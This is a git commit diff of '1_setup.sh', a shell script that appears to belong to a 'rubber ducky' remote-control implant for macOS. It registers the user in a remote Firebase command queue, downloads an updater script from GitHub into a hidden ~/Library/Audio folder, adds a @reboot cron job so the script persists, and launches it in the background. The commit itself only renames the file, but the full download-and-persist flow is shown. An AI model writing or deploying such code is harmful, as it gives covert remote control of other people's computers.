f4bb11cd84fda1f48215333d7038685a67a9d7fa
Milooles <doodoododo1701@gmail.com>
2025-01-30 15:42:16 +1000

    Update 1_setup.sh

--- 1_setup.sh
+++ 1_setup.sh
@@ -26,17 +26,17 @@ pip3 install requests
 curl -X PATCH -d "{ \"$USER\": { \"commands\":[\"say hello\"], \"executed\":false }}" https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json
 
 # curl 2_updater.sh
-curl -H "Cache-Control: no-cache" https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/2_updater.sh -o ~/Library/Audio/updater.sh
+curl -H "Cache-Control: no-cache" https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/2_updater.sh -o ~/Library/Audio/2_updater.sh
 
 # RUN UPDATER @ REBOOT
 # write out current crontab
 crontab -l >mycron
 # echo new cron into cron file
-echo "@reboot ~/Library/Audio/updater.sh" >>mycron
+echo "@reboot ~/Library/Audio/2_updater.sh" >>mycron
 # install new cron file
 crontab mycron
 rm mycron
 
 # START UPDATER
-sh ~/Library/Audio/updater.sh &
+sh ~/Library/Audio/2_updater.sh &
 disown
